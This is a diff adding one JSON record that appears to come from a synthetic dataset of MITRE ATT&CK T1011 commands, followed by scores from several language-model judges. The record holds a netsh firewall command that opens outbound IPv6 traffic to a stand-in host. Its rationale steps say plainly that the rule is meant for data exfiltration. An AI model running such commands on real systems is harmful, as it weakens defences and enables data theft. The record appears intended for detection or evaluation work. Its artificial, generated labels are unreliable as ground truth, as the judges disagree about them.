@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh advfirewall firewall add rule name=\"exfil_out_tcp6_49444\" dir=out action=allow enable=yes protocol=TCP remoteport=49444 remoteip=2001:db8:bad:cafe::44 profile=any",
+  "explanation": "Adds a narrowly scoped outbound firewall rule to allow IPv6 TCP egress to a specific high port/host used for alternate-medium exfiltration (T1011).",
+  "rationale_steps": [
+    "Open only the exact IPv6 destination and high TCP port needed for exfiltration.",
+    "Minimize side effects by scoping to a single remote IP and port.",
+    "Permit exfil over a non-standard IPv6 path unlikely to be blocked by default."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-53a96244",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed netsh advfirewall command with valid parameters, spacing, and balanced quoting.",
+        "semantic_score": 2,
+        "semantic_justification": "It adds an outbound IPv6 TCP allow rule to a specific host/port (plausible for egress) but requires administrative privileges and does not implement exfiltration over a different network medium as defined by T1011.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:51:23.156195Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for the netsh advfirewall firewall add rule command, including correctly formatted parameters, balanced quotes, and valid flag formats.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by creating a firewall rule that enables exfiltration over an IPv6 network connection to a specific host and port, which could be used as an alternate network medium for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:51:28.352368Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quotes, and valid flags for `netsh advfirewall`.",
+        "semantic_score": 2,
+        "semantic_justification": "The command correctly constructs a firewall rule, but it requires administrative privileges to execute, directly contradicting the stated 'Privilege: None' and making the claimed intent unachievable.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:18:52.872304Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
